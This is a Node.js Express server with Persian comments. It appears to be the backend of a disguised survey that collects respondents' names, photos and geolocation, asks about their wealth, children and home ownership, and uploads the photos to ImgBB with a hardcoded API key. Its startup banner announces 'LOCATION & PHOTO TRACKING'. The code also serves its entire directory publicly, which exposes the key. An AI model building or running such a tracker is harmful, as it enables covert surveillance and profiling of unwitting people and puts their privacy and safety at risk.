import express from "express";
import axios from "axios";
import path from "path";
import { fileURLToPath } from "url";

const app = express();
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// سرویس دهی فایل‌های استاتیک بدون محدودیت
app.use(express.static(__dirname));

app.use(express.json({ limit: "50mb" }));

// Route اصلی
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// API برای ارسال داده
const IMGBB_API_KEY = "2fe3007ea3853c345b114b7394111687";

// سوالات (همانند کلاینت)
const questions = [
  { key: 'age', text: 'چند سال دارید؟', options: ['بین ۲۰ تا ۳۰', 'بین ۳۰ تا ۴۰', 'بین ۴۰ تا ۵۰'] },
  { key: 'children', text: 'چند تا بچه دارید؟', options: ['۱', '۲ تا ۳', '۴ تا بیشتر'] },
  { key: 'animal', text: 'کدام حیوان را دوست دارید؟', options: ['سگ', 'گربه', 'لاک‌پشت'] },
  { key: 'city', text: 'کدام شهر  ها خانه داری', options: ['کیش', 'شمال', 'تهران'] },
  { key: 'money', text: 'در حال حاضر چقدر پول دارید؟', options: ['۱۰', '۱۰۰', '۱۰۰۰'] },
];

app.post("/send-sms", async (req, res) => {
  try {
    const { name, answers, photos, location } = req.body;

    console.log("📥 دریافت داده‌های نظرسنجی:", {
      name,
      answerCount: Object.keys(answers).length,
      photoCount: photos.length,
      location
    });

    const uploadedUrls = [];
    const results = [];

    // آپلود عکس‌ها به ImgBB
    for (let i = 0; i < photos.length; i++) {
      try {
        const base64 = photos[i];
        const imageData = base64.split(",")[1];
        const formData = new URLSearchParams();
        formData.append("key", IMGBB_API_KEY);
        formData.append("image", imageData);

        const result = await axios.post(
          "https://api.imgbb.com/1/upload",
          formData
        );
        
        // پیدا کردن سوال مربوطه
        const questionKey = Object.keys(answers)[i];
        const questionObj = questions.find(q => q.key === questionKey);
        
        // ذخیره اطلاعات کامل هر عکس
        const photoInfo = {
          url: result.data.data.url,
          question: questionObj?.text || `سوال ${i + 1}`,
          answer: answers[questionKey] || 'پاسخ نامشخص',
          location: location?.address || 'موقعیت نامشخص',
          timestamp: new Date().toLocaleString('fa-IR'),
          coordinates: location ? {
            lat: location.latitude,
            lng: location.longitude
          } : null
        };
        
        uploadedUrls.push(result.data.data.url);
        results.push(photoInfo);
        
        console.log("✅ عکس آپلود شد:", photoInfo);
      } catch (imgError) {
        console.error("❌ خطا در آپلود عکس:", imgError.message);
        
        const questionKey = Object.keys(answers)[i];
        const questionObj = questions.find(q => q.key === questionKey);
        
        results.push({
          url: `خطا: ${imgError.message}`,
          question: questionObj?.text || `سوال ${i + 1}`,
          answer: answers[questionKey] || 'پاسخ نامشخص',
          location: location?.address || 'موقعیت نامشخص',
          timestamp: new Date().toLocaleString('fa-IR'),
          error: true
        });
      }
    }

    console.log("📊 نتیجه نهایی:", {
      name,
      answers,
      location,
      results
    });

    return res.json({ 
      ok: true, 
      urls: uploadedUrls,
      results: results,
      message: "داده‌ها با موفقیت دریافت شد"
    });

  } catch (err) {
    console.error("❌ خطای سرور:", err.message);
    return res.status(500).json({ 
      ok: false, 
      error: err.message 
    });
  }
});

// Route تست سلامت
app.get("/health", (req, res) => {
  res.json({ status: "OK", message: "سرور در حال اجراست" });
});

const PORT = 3000;
app.listen(PORT, () => {
  console.log("=".repeat(50));
  console.log("🚀 SERVER RUNNING - LOCATION & PHOTO TRACKING");
  console.log("📡 Port: " + PORT);
  console.log("🔗 URL: http://localhost:3000");
  console.log("🔗 Health: http://localhost:3000/health");
  console.log("=".repeat(50));
});